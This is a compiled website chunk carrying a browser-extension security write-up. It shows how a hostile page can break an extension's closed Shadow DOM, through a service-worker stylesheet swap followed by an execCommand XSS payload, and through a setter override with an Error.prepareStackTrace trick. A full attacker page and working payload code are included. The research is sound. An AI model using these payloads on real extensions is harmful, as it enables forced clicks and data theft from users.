"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[324],{4255:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>c,contentTitle:()=>a,default:()=>h,frontMatter:()=>o,metadata:()=>s,toc:()=>l});const s=JSON.parse('{"id":"Attacks/Shadow","title":"Open Closed Shadow DOM","description":"Shadow DOM allows hidden DOM trees to be attached to elements in the regular DOM tree.","source":"@site/docs/Attacks/Shadow.mdx","sourceDirName":"Attacks","slug":"/Attacks/Shadow","permalink":"/Attacks/Shadow","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":3,"frontMatter":{"sidebar_position":3},"sidebar":"tutorialSidebar","previous":{"title":"Exploit Messages","permalink":"/Attacks/Message"},"next":{"title":"Clickjacking","permalink":"/Attacks/Clickjacking"}}');var i=n(4848),r=n(8453);const o={sidebar_position:3},a="Open Closed Shadow DOM",c={},l=[{value:"Remote stylesheets",id:"remote-stylesheets",level:2},{value:"Inline scripts",id:"inline-scripts",level:2}];function d(e){const t={a:"a",admonition:"admonition",code:"code",em:"em",h1:"h1",h2:"h2",header:"header",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,r.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(t.header,{children:(0,i.jsx)(t.h1,{id:"open-closed-shadow-dom",children:"Open Closed Shadow DOM"})}),"\n",(0,i.jsxs)(t.p,{children:[(0,i.jsx)(t.a,{href:"https://html.spec.whatwg.org/#parsing-main-inhead:attr-template-shadowrootmode:%7E:text=Let%20declarative%20shadow%20host%20element%20be%20adjusted%20current%20node",children:"Shadow DOM"})," allows hidden DOM trees to be attached to elements in the regular DOM tree.\n",(0,i.jsx)(t.img,{alt:"Shadow DOM",src:n(805).A+"",width:"1107",height:"509"})]}),"\n",(0,i.jsxs)(t.p,{children:["In practice, you can think of it as isolated HTML within another HTML file; however, what is important, unlike an iframe, is that it ",(0,i.jsx)(t.em,{children:"has a shared JavaScript execution context"})," with the main HTML."]}),"\n",(0,i.jsx)(t.p,{children:"Sometimes extensions use this to display information, buttons, and so on directly to the user on the page."}),"\n",(0,i.jsx)(t.p,{children:"It is important to understand that Shadow DOM is not a security mechanism, but unfortunately, it is sometimes used in this context..."}),"\n",(0,i.jsx)(t.h2,{id:"remote-stylesheets",children:"Remote stylesheets"}),"\n",(0,i.jsx)(t.p,{children:"Let's consider a collective example of code from a content script that I have encountered several times:"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-javascript",children:'const host = document.createElement(\'div\');\nhost.id="host"\nconst shadowRoot = host.attachShadow({ mode: \'closed\' });\n        \nshadowRoot.innerHTML = `<link rel="stylesheet" href="https://cdn.example.com/styles.css">\n<p>This content is inside a closed shadow root!</p>\n<button id=\'submit\'>ACCESS</button>`;\n\nshadowRoot.getElementById("submit").onclick = ()=>{\nconsole.log("Clicked!")\n// ...\n}\ndocument.body.appendChild(host);\n'})}),"\n",(0,i.jsx)(t.p,{children:"It seems that there are no problems with this code at all:"}),"\n",(0,i.jsxs)(t.ul,{children:["\n",(0,i.jsxs)(t.li,{children:["Closed Shadow DOM is used, so ",(0,i.jsx)(t.code,{children:"host.innerHTML"})," and ",(0,i.jsx)(t.code,{children:"host.shadowRoot"})," are inaccessible."]}),"\n",(0,i.jsx)(t.li,{children:"Styles are loaded from a third-party site."}),"\n"]}),"\n",(0,i.jsx)(t.p,{children:"However, as I said, the Shadow DOM will have the same JavaScript context as the site on which it runs, so an exploit becomes possible."}),"\n",(0,i.jsxs)(t.p,{children:["First, let's learn how to override styles; here a ",(0,i.jsx)(t.em,{children:"Service Worker"})," will help us, as this is our site, we can register a worker that simply intercepts the request and replaces it with our own."]}),"\n",(0,i.jsx)(t.p,{children:"Let's place the service worker registration on the attack page:"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-html",children:"    <script>\n    if ('serviceWorker' in navigator) {\n        navigator.serviceWorker.register('./slon.js')\n            .then(registration => {\n                console.log('Service worker registered:', registration);\n            })\n            .catch(error => {\n                console.error('Service worker registration failed:', error);\n            });\n    }\n    <\/script>\n"})}),"\n",(0,i.jsx)(t.p,{children:"And accordingly, the worker itself:"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-javascript",children:"self.addEventListener('fetch', (event) => {\n    if (event.request.destination === 'style') {\n        event.respondWith(\n            new Response(`p { color: red; }`, {\n                headers: { 'Content-Type': 'text/css' }\n            })\n        );\n    } else {\n        event.respondWith(fetch(event.request));\n    }\n});\n"})}),"\n",(0,i.jsx)(t.p,{children:"After its registration, you will see that the text inside the shadow root will turn red.\nBut what to do now? In fact, we can turn such a style injection into a full-fledged XSS!"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-css",children:"    p{\n        -webkit-user-modify: read-write;\n    }\n"})}),"\n",(0,i.jsxs)(t.p,{children:["Before continuing, let me explain what ",(0,i.jsx)(t.code,{children:"-webkit-user-modify"})," is; it is a CSS property that allows us to turn any element into an equivalent of an input tag :)"]}),"\n",(0,i.jsxs)(t.p,{children:["Here\u2019s how it will look in the browser:\n",(0,i.jsx)(t.img,{src:n(4142).A+"",width:"966",height:"516"})]}),"\n",(0,i.jsxs)(t.p,{children:["What is this for? - To use ",(0,i.jsx)(t.a,{href:"https://developer.mozilla.org/en-US/docs/Web/API/Document/execCommand",children:(0,i.jsx)(t.code,{children:"document.execCommand"})})," - a legacy API that allows inserting and selecting text in writable fields."]}),"\n",(0,i.jsx)(t.p,{children:"After that, we only need to call the following code:"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-javascript",children:'find("This content is inside a closed")\ndocument.execCommand("insertHTML", false, `<img src=1 onerror=\'this.getRootNode().getElementById("submit").click()\'>`)\n'})}),"\n",(0,i.jsx)(t.p,{children:"This code does the following:"}),"\n",(0,i.jsxs)(t.ul,{children:["\n",(0,i.jsxs)(t.li,{children:[(0,i.jsx)(t.code,{children:"find"})," locates and selects text from the shadow root."]}),"\n",(0,i.jsxs)(t.li,{children:[(0,i.jsx)(t.code,{children:"document.execCommand"})," inserts HTML in place of the selection."]}),"\n",(0,i.jsxs)(t.li,{children:["The HTML contains an XSS payload; ",(0,i.jsx)(t.code,{children:"this"})," refers to the current tag, and ",(0,i.jsx)(t.code,{children:"getRootNode()"})," returns the Shadow Root."]}),"\n",(0,i.jsx)(t.li,{children:"After that, we get an instance of the button and click it."}),"\n"]}),"\n",(0,i.jsx)(t.p,{children:"The finall attacker page:"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-html",children:'<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>Slonser</title>\n</head>\n<body>\n    <script>\n        if (\'serviceWorker\' in navigator) {\n            navigator.serviceWorker.register(\'./slon.js\')\n                .then(registration => {\n                    console.log(\'Service worker registered:\', registration);\n                    registration.active.onerror = (event) => {\n                         console.log("An error occurred in the service worker!");\n                    };\n                })\n                .catch(error => {\n                    console.error(\'Service worker registration failed:\', error);\n                });\n        }\n        setInterval(()=>{\n            find("This content is inside a closed")\n            document.execCommand("insertHTML", false, `<img src=1 onerror=\'this.getRootNode().getElementById("submit").click()\'>`)\n        },1000);\n        <\/script>\n</body>\n</html>\n'})}),"\n",(0,i.jsx)(t.p,{children:"And service worker:"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-javascript",children:"self.addEventListener('fetch', (event) => {\n    if (event.request.destination === 'style') {\n        event.respondWith(\n            new Response(`    p{\n        -webkit-user-modify: read-write;\n    }`, {\n                headers: { 'Content-Type': 'text/css' }\n            })\n        );\n    }else {\n        event.respondWith(fetch(event.request));\n    }\n});\n"})}),"\n",(0,i.jsx)(t.h2,{id:"inline-scripts",children:"Inline scripts"}),"\n",(0,i.jsx)(t.p,{children:"There are also cases where the Shadow DOM contains inline scripts, which makes it even easier to trigger clicks or steal text data.\nLet's consider the following example:"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-javascript",children:'  const host = document.createElement(\'div\');\n  host.id="host"\n  const shadowRoot = host.attachShadow({ mode: \'closed\' });        \n  shadowRoot.innerHTML = `\n      ...\n        <img src="https://example.com/avatar/${avatar_id}" onerror="this.src=\'https://example.com/avatar/blank.png\'">\n      ...\n      <button id=\'submit\'>ACCESS</button>`;\n  shadowRoot.getElementById("submit").onclick = ()=>{\n      console.log("Clicked!")\n      // ...\n  }\n  document.body.appendChild(host);\n'})}),"\n",(0,i.jsx)(t.p,{children:"As mentioned earlier, the JS context in such cases is unified, so let's just rewrite the Setter!:"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-JavaScript",children:"document.createElement('img').__proto__.__defineSetter__(\"src\",()=>{alert()})\n"})}),"\n",(0,i.jsx)(t.p,{children:"Unfortunately, this does not give us a reference to the Shadow DOM, but there is a trick that will allow us to obtain it:"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-javascript",children:'Error.prepareStackTrace = (a,b)=>{\n    b[0].getThis().parentNode.getElementById("submit").click();\n}\ndocument.createElement(\'img\').__proto__.__defineSetter__("src",()=>{throw new Error();})\n'})}),"\n",(0,i.jsx)(t.p,{children:"I understand that this may cause confusion, so let me explain what is happening here:"}),"\n",(0,i.jsxs)(t.ul,{children:["\n",(0,i.jsx)(t.li,{children:"We rewrite the attribute setter so that it throws an error."}),"\n",(0,i.jsxs)(t.li,{children:["In V8, when an error is created, ",(0,i.jsx)(t.code,{children:"Error.prepareStackTrace"})," is called."]}),"\n",(0,i.jsxs)(t.li,{children:["In ",(0,i.jsx)(t.code,{children:"Error.prepareStackTrace"}),", the entire ",(0,i.jsx)(t.code,{children:"CallStack"})," is passed as the second parameter."]}),"\n",(0,i.jsxs)(t.li,{children:[(0,i.jsx)(t.code,{children:"b[0].getThis()"})," will return the ",(0,i.jsx)(t.code,{children:"this"})," from the original call that initiated the entire chain. In our case, this is a reference to the ",(0,i.jsx)(t.code,{children:"<img>"})," tag."]}),"\n"]}),"\n",(0,i.jsx)(t.admonition,{title:"Note",type:"tip",children:(0,i.jsx)(t.p,{children:"Accordingly, in the case of inline scripts, you can always obtain a reference to the shadow DOM if you find a way to trigger an error in the inline script."})})]})}function h(e={}){const{wrapper:t}={...(0,r.R)(),...e.components};return t?(0,i.jsx)(t,{...e,children:(0,i.jsx)(d,{...e})}):d(e)}},4142:(e,t,n)=>{n.d(t,{A:()=>s});const s=n.p+"assets/images/read-write-96eff6d99ce9d9b5899812772f923587.jpg"},805:(e,t,n)=>{n.d(t,{A:()=>s});const s=n.p+"assets/images/shadowdom-902121a5885cf11e40487a3b91c5b56b.svg"},8453:(e,t,n)=>{n.d(t,{R:()=>o,x:()=>a});var s=n(6540);const i={},r=s.createContext(i);function o(e){const t=s.useContext(r);return s.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function a(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:o(e.components),s.createElement(r.Provider,{value:t},e.children)}}}]);